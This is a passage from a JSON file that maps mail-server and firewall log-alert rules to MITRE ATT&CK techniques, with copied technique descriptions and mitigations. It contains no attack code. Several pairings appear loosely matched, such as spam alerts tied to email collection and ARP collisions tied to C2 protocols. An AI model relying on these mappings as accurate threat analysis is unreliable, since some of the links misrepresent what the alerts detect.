            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3153,
        "rule_description": "sendmail: Multiple relaying attempts of spam.",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3154,
        "rule_description": "sendmail: Multiple attempts to send e-mail",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3155,
        "rule_description": "sendmail: Multiple attempts to send e-mail from",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3156,
        "rule_description": "sendmail: Multiple rejected e-mails from same source ip.",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3158,
        "rule_description": "sendmail: Multiple pre-greetings rejects.",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3191,
        "rule_description": "sendmail: SMF-SAV sendmail milter unable to verify",
        "mitre_id": [
            "T1114"
        ],
        "possible_attacks": [
            "Email Collection"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3751,
        "rule_description": "mailscanner: Multiple attempts of spam.",
        "mitre_id": [
            "T1110",
            "T1114"
        ],
        "possible_attacks": [
            "Brute Force",
            "Email Collection"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. "
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts."
        ]
    },
    {
        "rule_id": 3851,
        "rule_description": "ms-exchange: Multiple e-mail attempts to an invalid account.",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3852,
        "rule_description": "ms-exchange: Multiple e-mail 500 error code (spam).",
        "mitre_id": [
            "T1114",
            "T1499"
        ],
        "possible_attacks": [
            "Email Collection",
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients. ",
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Use secure out-of-band authentication methods to verify the authenticity of critical actions initiated via email, such as password resets, financial transactions, or access requests. For highly sensitive information, utilize out-of-band communication channels instead of relying solely on email to prevent adversaries from collecting data through compromised email accounts.",
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 3910,
        "rule_description": "Courier brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 3911,
        "rule_description": "Courier: Multiple connection attempts from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 4325,
        "rule_description": "PIX: ARP collision detected.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 4336,
        "rule_description": "PIX: AAA (VPN) user locked out.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 4337,
        "rule_description": "PIX: The PIX is disallowing new connections.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 4339,
        "rule_description": "PIX: Firewall configuration deleted.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
